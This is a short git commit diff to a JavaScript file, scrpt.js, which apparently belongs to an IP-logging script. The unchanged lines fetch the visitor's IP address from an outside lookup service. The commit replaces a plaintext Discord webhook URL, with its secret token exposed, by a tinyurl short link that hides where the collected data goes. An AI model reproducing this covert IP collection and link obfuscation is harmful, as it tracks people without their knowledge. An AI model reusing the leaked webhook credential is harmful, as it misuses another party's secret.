c1cb26a684d3509899b38b995027f188ba7803bd
DorkYBru <76796721+DorkYBru@users.noreply.github.com>
2023-01-04 21:12:54 +0100

    Update scrpt.js

--- scrpt.js
+++ scrpt.js
@@ -1,4 +1,4 @@
-var webHookUrl = "https://discord.com/api/webhooks/1060286133726085151/9AD3vowr2JRrZ9J-io83BTZY_aFQqu_zPLurNqIrCMuI1dp0dScD2onSpAS5HRAZ5pwF";
+var webHookUrl = "https://tinyurl.com/4wnnjtra";
 const request = async () => { // Calling a "synchronous" fetch
     const response = await fetch('https://ip.aruljohn.com/');
     const data = await response.text();
